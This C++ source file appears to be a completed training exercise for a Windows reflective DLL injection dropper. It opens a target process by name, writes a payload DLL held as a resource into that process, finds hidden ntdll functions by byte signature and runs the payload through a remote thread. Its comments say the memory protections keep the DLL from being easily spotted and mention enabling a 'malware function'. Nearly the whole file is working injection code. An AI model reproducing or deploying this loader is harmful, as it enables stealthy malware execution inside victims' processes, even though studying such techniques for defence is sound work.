#include "Dropper.h"
//Global Variables
PREFLECTIVE_LOADER_HELPER pHelper;
HMODULE hUnit = NULL;

PCHAR cProcessName;
HANDLE hTargetProcess;

PVOID pPayloadDLL, pPreferredBaseDLL, pAddressHelper,pAddressDLLInRemoteProcess;
DWORD dwPayloadDLLSize, dwDelta;
DWORD64 dwThreadStartAddress;

PIMAGE_DOS_HEADER pIDH;
PIMAGE_NT_HEADERS pINH;
PIMAGE_SECTION_HEADER pISH;

GetRelocationEntriesDefault _GetRelocationEntriesDefault;


/*##################################################################################################################################################################################*/
//EXCERCISES

// Exercise 1
// You will need to allocate memory for both the DLL and the Helper code
// Also calculate the difference in delta and place this value in the helper structure at dwDelta, finally update the header pINH with the new baseaddress
// If you get an error, please check on MSDN what error it is, the last error code will be printedo ut to you
DWORD AllocateMemory() {
	//Allocate memory for helper
	//Check the documentation for VirtualAllocEx online for more info
	pAddressHelper = pHelper->ReflectiveLoaderFunctions.__VirtualAllocEx(hTargetProcess, NULL, sizeof(REFLECTIVE_LOADER_HELPER), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (pAddressHelper == NULL) {
		printf("\n[*]ERROR: in allocating for helper. Last error: %d", GetLastError());
		return 0;
	}

	//Allocate memory for DLL
	//First try to allocate memory at the preferredbase, if that fails, allocate memory at a random place
	//Check the documentation for VirtualAllocEx online for more info
	pAddressDLLInRemoteProcess = pHelper->ReflectiveLoaderFunctions.__VirtualAllocEx(hTargetProcess, pPreferredBaseDLL, pINH->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!pAddressDLLInRemoteProcess) {
		pAddressDLLInRemoteProcess = pHelper->ReflectiveLoaderFunctions.__VirtualAllocEx(hTargetProcess, NULL, pINH->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	}

	//Calculate Delta between pNewBaseAddr and pPreferedBaseAddr and place it in pHelper->dwDelta
	pHelper->dwDelta = (DWORD64)pAddressDLLInRemoteProcess - (DWORD64)pPreferredBaseDLL;

	return 1;
}

// Exercise 2
// Now we need to find the non-exported NTDLL functions needed to Init TLS and SEH in the reflective loader code
// Since these are not exported, we can't use our nice TYPEDEF trick, we will need to search for them in memory ourself
// Finding these offsets will be your first task, so hop over to the GetNonExportedNTDLLFunctions function and own that code!
DWORD GetNonExportedNTDLLFunctions() {
	// This will hold our offset found, it should always only contain ONE item
	// The code will check if multiple entries where found, in that case you will need to retake your steps
	vector<DWORD64> dwOffset;

	//CHANGE memory snippet
	// First function to find is _LdrpHandleTlsData
	// This function is used to initialize TLS data, and no, this has nothing to do with HTTPS ;). If you want more info on Thread Local Storage, look it up :D
	// 
	// Find the offset using a memory snippet of the function, use this notation:
	// findOffset("\x11\x22\x33\x44", dwOffset)
	//
	//Afterwards add it to the helperfunctions structure and make sure you add the function AT THE START (so you will need to substract the number of bytes your chosen memory snippet is from the actual start of the function
	//TIP: DO NOT USE \x00 characters, since we are using PCHAR this would mean the end of the string
	findOffset("\x40\x49\x8b\xe3\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x5f\xc3\x65\x48", dwOffset);
	
	//Add it to the helper functions structure
	pHelper->ReflectiveLoaderFunctions.__LdrpHandleTlsData = (_LdrpHandleTlsData)((LPBYTE)dwOffset.front() - 0x40); //CHANGE add to helper functions
	dwOffset.clear();
	//CHANGE memory snippet
	// Now do the same for RtlInsertInvertedFunctionTableoffset
	// This function is used to initialize SEH data on 64bit, since 64bit uses stack rewinding and not SEH chains
	findOffset("\xec\x20\x8b\xf2\x4c\x8d\x4c\x24\x50\xb2\x01\x41\xb8\x03", dwOffset);
	
	pHelper->ReflectiveLoaderFunctions.__RtlInsertInvertedFunctionTable = (_RtlInsertInvertedFunctionTable)((LPBYTE)dwOffset.front() - 0x10); //CHANGE add to helper functions
	dwOffset.clear();

	return 1;
}

// Exercise 3
// You will need to write all items to the memory location you allocated
DWORD WriteMemory() {
	//Write helper
	//Make use of NtWriteVirtualMemory
	//Search online for more information on this function
	if (pHelper->ReflectiveLoaderFunctions.__NtWriteVirtualMemory(hTargetProcess, pAddressHelper, pHelper, sizeof(REFLECTIVE_LOADER_HELPER), NULL) != 0) {
		return 0;
	}
	//Write the target image PE HEADER into the victim process
	//Make use of NtWriteVirtualMemory
	//Search online for more information on this function
	if (pHelper->ReflectiveLoaderFunctions.__NtWriteVirtualMemory(hTargetProcess, pAddressDLLInRemoteProcess, pPayloadDLL, pINH->OptionalHeader.SizeOfHeaders, NULL) != 0) {
		return 0;
	}
	//Write the target image sections into the victim process
	//Make use of NtWriteVirtualMemory
	//Search online for more information on this function
	//
	//You will need to create a for loop and loop until you reach pINH->FileHeader.NumberOfSections
	//In each loop you will need to write the SECTION_HEADER for that section, the way to do is, is to find them in memory starting from the address where the payloadDLL is loaded
	//The DLL is loaded in THIS VIRTUAL MEMORY, so no need to use functions such as NtReadVirtualMemory()
	//TIP: To cast an offset of a memory address you need to use the following syntax: (PIMAGE_SECTION_HEADER)((LPBYTE)BASEADDR + 20)

	//This will first case the baseaddr to a byte pointer, adding 20 bytes to it and then casting the resulting address to PIMAGE_SECTION_HEADER
	//Good Luck!
	for (int i = 0; i<pINH->FileHeader.NumberOfSections; i++)
	{
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)pPayloadDLL + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (pHelper->ReflectiveLoaderFunctions.__NtWriteVirtualMemory(hTargetProcess, (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pISH->VirtualAddress), (PVOID)((LPBYTE)pPayloadDLL + pISH->PointerToRawData), pISH->SizeOfRawData, NULL) != 0) {
			return 0;
		}
	}

	return 1;
}

// Exercise 4
// After you have successfully solved previous exercises it is now time to execute our Reflective DLL code
// A couple of things will need to happen for this
// 1. You will need to find the exported function ReflectiveInjection(PVOID)
// 2. You will have to create a remote thread in the process that will execute this function passing the HELPER STRUCTURE address with it
//Tip: Use the function pHelpe->ReflectiveLoaderFunctions.__RtlCreateUserThread() to create the remote thread, more info on MSDN (Use the Google, Luke)
DWORD ExecuteReflectiveLoader()
{

	HANDLE hThread = NULL;
	PVOID ReflectiveLoader = NULL, pReflectiveInjectionAddress=NULL;
	CLIENT_ID cid;
	PIMAGE_EXPORT_DIRECTORY pIED = new IMAGE_EXPORT_DIRECTORY();
	PIMAGE_EXPORT_ADDRESS_ENTRY pIED_entry = new IMAGE_EXPORT_ADDRESS_ENTRY();
	
	//To be if you want to import by name and be a badass (and maybe learn something in the process :p)
	PIMAGE_EXPORT_NAME_ENTRY pNameEntry = new IMAGE_EXPORT_NAME_ENTRY; 
	DWORD dwNumberOfFunctions;
	DWORD dwIndex;
	PCHAR pFunctioname;
	
	//Read in the EXPORT table
	if (pHelper->ReflectiveLoaderFunctions.__NtReadVirtualMemory(hTargetProcess, pHelper->ExportTableAddress, pIED, sizeof(IMAGE_EXPORT_DIRECTORY), 0) != 0) {
		VirtualFreeEx(hTargetProcess, pAddressDLLInRemoteProcess, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);
		return 0;
	}

	// Now is it time to find address of the exported function ReflectiveInjection
	// You have two options here, the EASY route where you just assume (and you would be correct) that the ReflectiveInjection is the second exported function
	// In that case you just need to read the second entry from the AddressOfFunctions RVA in the STRUCTURE IMAGE_EXPORT_DIRECTORY.
	//
	// OR
	//
	// You can be a badass coder and try to look it up by name, meaning looping through the names in the AddressOfNames Array and using the found index to
	// obtain the correct address from AddressOfFunctions (which would be 2)
	// The later is more work, but it makes sure that you will ALWAYS call the correct function
	dwNumberOfFunctions = pIED->NumberOfFunctions;
	for (dwIndex = 0; dwIndex < dwNumberOfFunctions; dwIndex++) {
		pHelper->ReflectiveLoaderFunctions.__NtReadVirtualMemory(hTargetProcess, (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pIED->AddressOfNames+(sizeof(IMAGE_EXPORT_NAME_ENTRY)*dwIndex)), pNameEntry, sizeof(IMAGE_EXPORT_NAME_ENTRY), NULL);
		pFunctioname = new char[100];
		pHelper->ReflectiveLoaderFunctions.__NtReadVirtualMemory(hTargetProcess, (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pNameEntry->NameRVA), pFunctioname, 20, NULL);
		if (strcmp(pFunctioname, "ReflectiveInjection") == 0) {
			break;
		}

	}
	PIMAGE_EXPORT_NAMEORDINAL pNameOrdinal = new IMAGE_EXPORT_NAMEORDINAL;
	pHelper->ReflectiveLoaderFunctions.__NtReadVirtualMemory(hTargetProcess, (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pIED->AddressOfNameOrdinals+(sizeof(IMAGE_EXPORT_NAMEORDINAL)*dwIndex)), pNameOrdinal, sizeof(IMAGE_EXPORT_ADDRESS_ENTRY), 0);
	
	
	pReflectiveInjectionAddress = (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pIED->AddressOfFunctions + sizeof(IMAGE_EXPORT_ADDRESS_ENTRY)*pNameOrdinal->Ordinal);
	if (pHelper->ReflectiveLoaderFunctions.__NtReadVirtualMemory(hTargetProcess, pReflectiveInjectionAddress, pIED_entry, sizeof(IMAGE_EXPORT_ADDRESS_ENTRY), 0) != 0) {
		VirtualFreeEx(hTargetProcess, pAddressDLLInRemoteProcess, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);
		return 0;
	}

	// After correctly finding the exported function you need to call it using RtlCreateUserThread
	// As this is an undocumented function I will give you the definition:
	/*RtlCreateUserThread(
		IN HANDLE               ProcessHandle,
		IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
		IN BOOLEAN              CreateSuspended, //Set this to one if you want to debug your reflective loader, it will start the thread suspended and you can then set a breakpoint in x64dbg on its entry point
		IN ULONG                StackZeroBits //0 for default
		IN OUT PULONG           StackReserved, //0 for default
		IN OUT PULONG           StackCommit, //0 for default
		IN PVOID                StartAddress, 
		IN PVOID                StartParameter OPTIONAL, // Helper Address
		OUT PHANDLE             ThreadHandle,
		OUT PCLIENT_ID          ClientID);
		*/
	pHelper->ReflectiveLoaderFunctions.__RtlCreateUserThread(hTargetProcess, NULL, 0, 0, 0, 0, (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pIED_entry->Address), pAddressHelper, &hThread, &cid);
	if (hThread == NULL) {
		VirtualFreeEx(hTargetProcess, pAddressDLLInRemoteProcess, 0, MEM_RELEASE);
		CloseHandle(hTargetProcess);
		return 0;
	}

	//DON'T CHANGE THIS
	pHelper->ReflectiveLoaderFunctions.__NtQueryInformationThread(hThread, (THREADINFOCLASS)9, &dwThreadStartAddress, sizeof(DWORD64), NULL);
	return 1;
}

//##################################################################################################################################################################################//
// FUNCTIONS DEFINED UNDERNEATH ARE NOT TO BE CHANGED, IF YOU DO AND SCREW SOMETHING UP YOU ARE ON YOUR OWN


// DO NOT CHANGE THESE FUNCTIONS
DWORD secp2vmemp[2][2][2] = {
	{
		//not executable
		{ PAGE_NOACCESS, PAGE_WRITECOPY },
		{ PAGE_READONLY, PAGE_READWRITE }
	},
	{
		//executable
		{ PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY },
		{ PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE }
	}
};


//Main function
DWORD Inject(PCHAR cProc, HMODULE unit)
{
	DWORD dwExerciseResults[6] = {0,0,0,0,0,0};
	hUnit = unit;
	cProcessName = cProc;
	pHelper = new REFLECTIVE_LOADER_HELPER;
	PUNITTEST pUnitTest = new UNITTEST;
	_GetRelocationEntriesDefault=(GetRelocationEntriesDefault)GetProcAddress(hUnit, "GetRelocationEntriesDefault");
	Check _Check=(Check)GetProcAddress(hUnit, "Check");
	bool bFailed = false;

	if (!InitHelperFunctions()) {
			printf("\n[*] ERROR in InitHelperFunctions");
		return 0;
	}

	if (!InitInject()) {
		printf("\n[*] ERROR in InitInject");
		return 0;
	}
	if (!AllocateMemory()) {
		printf("\n[*] ERROR in AllocateMemory");
		return 0;
	}

	////Test Exercises 1
	//pUnitTest->dwAddressDLL=(DWORD64)pAddressDLLInRemoteProcess;
	//pUnitTest->dwAddressHelper = (DWORD64)pAddressHelper;
	//dwExerciseResults[0] = _Check(pUnitTest, 1);
	////

	////Test Exercises 2
	//pUnitTest->ReflectiveLoaderHelper = pHelper;
	//pUnitTest->LdrpHandleTlsData = (DWORD64)pUnitTest->ReflectiveLoaderHelper->ReflectiveLoaderFunctions.__LdrpHandleTlsData;
	//pUnitTest->RtlInsertInvertedFunctionTable = (DWORD64)pUnitTest->ReflectiveLoaderHelper->ReflectiveLoaderFunctions.__RtlInsertInvertedFunctionTable;
	//dwExerciseResults[1] = _Check(pUnitTest, 2);
	////
	if (!InitHelper()) {
		printf("\n[*] ERROR in InitHelper");
		return 0;
	}
	if (!WriteMemory()) {
		printf("\n[*] ERROR in WriteMemory, Last Error: %d", GetLastError());
		return 0;
	}
	////Test Exercise 3
	//pUnitTest->process = hTargetProcess;
	//dwExerciseResults[2] = _Check(pUnitTest, 3);
	////

	////For progress checking purposes
	//_GetRelocationEntriesDefault(hTargetProcess,pAddressDLLInRemoteProcess, pHelper);
	////

	if (!ProtectMemory()) {
		printf("\n[*] ERROR in ProtectMemory");
		return 0;
	}
	if (!ExecuteReflectiveLoader()) {
		printf("\n[*] ERROR in ExecuteReflectiveLoader");
		return 0;
	}

	////Checker exercise 4
	//pUnitTest->dwThreadEntry = dwThreadStartAddress;
	//dwExerciseResults[3] = _Check(pUnitTest, 4);
	////
	////Sleep 100ms so that ReflectiveLoader can do its job
	//Sleep(100);
	//dwExerciseResults[4] = _Check(pUnitTest, 5); //Test exercise 5
	//dwExerciseResults[5] = _Check(pUnitTest, 6); //Test exercise 6
	

	////Print progress output
	//for (int i = 0; i < 6 ;i++) {
	//	if (!dwExerciseResults[i]) {
	//		bFailed = true;
	//		break;
	//	}
	//}

	//if (bFailed) {
	//	printf("\n\nNot all exercises completed! Try harder!!");
	//}
	//else {
	//	printf("\n\nWinner Winner, chicken dinner. You can now safely uncomment the lines to call DLLMAIN and malware function!\n\n");
	//}
	return 1;
}

// Creates and populates the helper functions needed, this structure will be added to the main helper structure later
DWORD InitHelperFunctions()
{
	// The only imports we actually need are LoadLibraryA and GetProcAddress
	// Since the reflective loader needs LoadLibrary for fixing the imports we are adding this to the structure in order to pass it the reflective loader function
	pHelper->ReflectiveLoaderFunctions.__LoadLibrary = (_LoadLibrary)LoadLibraryA;

	//NTDLL functions
	pHelper->ReflectiveLoaderFunctions.__NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtReadVirtualMemory");
	pHelper->ReflectiveLoaderFunctions.__NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtWriteVirtualMemory");
	pHelper->ReflectiveLoaderFunctions.__RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlCreateUserThread");
	pHelper->ReflectiveLoaderFunctions.__NtQueryInformationThread = (_NtQueryInformationThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
 
	//KERNEL32 functions
	pHelper->ReflectiveLoaderFunctions.__OpenProcess = (_OpenProcess)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OpenProcess");
	pHelper->ReflectiveLoaderFunctions.__VirtualAllocEx = (_VirtualAllocEx)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAllocEx");
	pHelper->ReflectiveLoaderFunctions.__VirtualProtectEx = (_VirtualProtectEx)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtectEx");
	pHelper->ReflectiveLoaderFunctions.__VirtualAlloc = (_VirtualAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualAlloc");
	pHelper->ReflectiveLoaderFunctions.__VirtualProtect = (_VirtualProtect)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
	pHelper->ReflectiveLoaderFunctions.__GetProcAddress = (_GetProcAddress)GetProcAddress;
	pHelper->ReflectiveLoaderFunctions.__OutputDebugString = (_OutputDebugString)GetProcAddress(GetModuleHandleA("kernel32.dll"), "OutputDebugStringA");

	GetNonExportedNTDLLFunctions();

	return 1;
}

//This function will create and populate the Helper structure for the Reflective loader
DWORD InitHelper() {
	PIMAGE_SECTION_HEADER pISH;

	//Populate
	pHelper->ImageBase = pAddressDLLInRemoteProcess;
	pHelper->ImportTableAddress = (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
	pHelper->ExportTableAddress = (pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == 0) ? NULL : (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	pHelper->TLSDirectory = (pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress == 0) ? NULL : (PVOID)((LPBYTE)pAddressDLLInRemoteProcess + pINH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);
	pHelper->pINH = (PIMAGE_NT_HEADERS)((LPBYTE)pAddressDLLInRemoteProcess + pIDH->e_lfanew);
	
	return 1;
}

// Initializes all variables and data needed to inject, this includes all information needed from the PE Header
// This function will also copy our DLL into memory from a resource
DWORD InitInject() {
	DWORD _dwProcessId;
	if (!GetProcessByName(cProcessName, &_dwProcessId)) {
		printf("\nError: %d", GetLastError());
		return 0;
	}

	//OpenProcess explorer.exe
	hTargetProcess = pHelper->ReflectiveLoaderFunctions.__OpenProcess(PROCESS_ALL_ACCESS, FALSE, _dwProcessId);

	//Get DLL from resource
	if (!GetResource(&pPayloadDLL, &dwPayloadDLLSize)) {
		return 0;
	}

	if (!InitPEHeaderInfo()) {
		return 0;
	}

	return 1;
}

//Copy the DLL from the PE resource into memory
DWORD GetResource(PVOID* pDLL, PDWORD dwDLLSize) {
	//Bomb resource
	HRSRC hRes = FindResource(0, MAKEINTRESOURCE(IDR_BLOB1), _T("BLOB"));
	if (!hRes) {
		printf("\n[*]ERROR: Can not find the resource");
		return 0;
	}

	HGLOBAL hData = LoadResource(0, hRes);
	if (!hData) {
		printf("\n[*]ERROR: Can not load the resource");
		return 0;
	}
	PVOID data = (char*)LockResource(hData);
	*dwDLLSize = SizeofResource(0, hRes);

	PVOID pBufferBomb = pHelper->ReflectiveLoaderFunctions.__VirtualAlloc(NULL, *dwDLLSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(pBufferBomb, data, *dwDLLSize);
	*pDLL = pBufferBomb;
	return 1;
}

//Obtains all necessary information for the PE Header of the to be injected DLL
DWORD InitPEHeaderInfo()
{
	pIDH = (PIMAGE_DOS_HEADER)pPayloadDLL;

	//Check for valid PE file
	if (pIDH->e_magic != IMAGE_DOS_SIGNATURE)
	{
		printf("\nError: Invalid executable format.\n");
		return 0;
	}

	//Load NT_HEADER and get preferred base
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)pPayloadDLL + pIDH->e_lfanew); // Get the address of the IMAGE_NT_HEADERS
	pPreferredBaseDLL = (PVOID)pINH->OptionalHeader.ImageBase;
	return 1;
}

// Protect the memory with the correct permissions, e.g. text should only have READ rights
// This will make sure that your DLL is not easily spotted by anti-forensics
DWORD ProtectMemory()
{
	//PROTECT MEMORY
	//This makes sure we have no PAGE_EXECUTE_READWRITE memory as this is a huge red flag
	if (!protect_remote_secs(hTargetProcess, pAddressDLLInRemoteProcess, pINH)) {
		return 0;
	}
	return 1;
}

//Function converts characteristics to DWORD bit masked
DWORD secp_to_vmemp(DWORD secp)
{
	DWORD vmemp;
	int executable, readable, writable;

	executable = (secp & IMAGE_SCN_MEM_EXECUTE) != 0;
	readable = (secp & IMAGE_SCN_MEM_READ) != 0;
	writable = (secp & IMAGE_SCN_MEM_WRITE) != 0;
	vmemp = secp2vmemp[executable][readable][writable];
	if (secp & IMAGE_SCN_MEM_NOT_CACHED)
		vmemp |= PAGE_NOCACHE;
	return vmemp;
}


//Function reads in characteristics for each section and applies them
DWORD protect_remote_secs(HANDLE proc, void *base, const IMAGE_NT_HEADERS *snthdrs)
{
	IMAGE_SECTION_HEADER *sec_hdr;
	DWORD old_prot, new_prot;
	WORD i;

	/* protect the PE headers */
	VirtualProtectEx(proc, base, snthdrs->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &old_prot);
	/* protect the image sections */
	sec_hdr = (IMAGE_SECTION_HEADER *)(snthdrs + 1);
	for (i = 0; i < snthdrs->FileHeader.NumberOfSections; ++i) {
		if (!i == 1) {
			void *section;
			section = (char *)base + sec_hdr[i].VirtualAddress;
			new_prot = secp_to_vmemp(sec_hdr[i].Characteristics);
			if (!VirtualProtectEx(proc, section, sec_hdr[i].Misc.VirtualSize, new_prot, &old_prot))
				return 0;
		}
	}


	return 1;
}


//Gets a process by name instead of PID
DWORD GetProcessByName(PCHAR processName, DWORD * id)
{
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 process;

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	process.dwSize = sizeof(PROCESSENTRY32);

	while (Process32Next(hSnapshot, &process)) {
		if (!strcmp(process.szExeFile, processName)) {
			*id = process.th32ProcessID;
			return 1;
		}
	}
	return 0;
}

// This function uses the Boyer-Moore algorithm to find a needle in a haystack
// It's been adapted to search only in the TEXT section of ntdll.dll, since this is the only place we need to search in
// However it can easily be adapted to search anywhere for any size
// I have done this in my own injection as you need to perform several code patches for Windows 8 and windows 7 for our reflective dll injector to work
// However, if you want to do this, you'll need to do some of your own research ;)
DWORD findOffset(const PCHAR pPattern, std::vector<uint64_t>& vOffset, uint64_t value_offset) {
	HMODULE hModule;
	PIMAGE_DOS_HEADER pIDH;
	PIMAGE_NT_HEADERS pINH;
	PIMAGE_SECTION_HEADER pISH;
	DWORD dwNumberOfSections;
	PVOID pTextBase=NULL;
	DWORD64 dwTextSize;
	std::vector<uint8_t> _pattern(pPattern, pPattern + strlen(pPattern));

	hModule = GetModuleHandleA("ntdll.dll");
	pIDH = (PIMAGE_DOS_HEADER)hModule;
	pINH = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pIDH->e_lfanew);
	dwNumberOfSections = pINH->FileHeader.NumberOfSections;

	for (DWORD i = 0; i < dwNumberOfSections; i++) {
		pISH = (PIMAGE_SECTION_HEADER)((LPBYTE)hModule + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		if (strcmp((char *)pISH->Name, ".text") == 0) {
			pTextBase = reinterpret_cast<PVOID>(reinterpret_cast<size_t>(hModule) + pISH->VirtualAddress);
			dwTextSize = (DWORD64)pISH->SizeOfRawData;
			break;
		}
	}

	size_t bad_char_skip[UCHAR_MAX + 1];

	const uint8_t* haystack = reinterpret_cast<const uint8_t*>(pTextBase);
	const uint8_t* needle = &_pattern[0];
	uintptr_t       nlen = _pattern.size();
	uintptr_t       scan = 0;
	uintptr_t       last = nlen - 1;

	//
	// Preprocess
	//
	for (scan = 0; scan <= UCHAR_MAX; ++scan)
		bad_char_skip[scan] = nlen;

	for (scan = 0; scan < last; ++scan)
		bad_char_skip[needle[scan]] = last - scan;

	//
	// Search
	//
	while (dwTextSize >= static_cast<size_t>(nlen))
	{
		for (scan = last; haystack[scan] == needle[scan]; --scan)
		{
			if (scan == 0)
			{
				if (value_offset != 0)
					vOffset.emplace_back(REBASE(haystack, pTextBase, value_offset));
				else
					vOffset.emplace_back(reinterpret_cast<uint64_t>(haystack));
			}
		}

		dwTextSize -= bad_char_skip[haystack[last]];
		haystack += bad_char_skip[haystack[last]];
	}
	if (vOffset.empty()) {
		return 0;
	}
	else {
		return 1;
	}
}

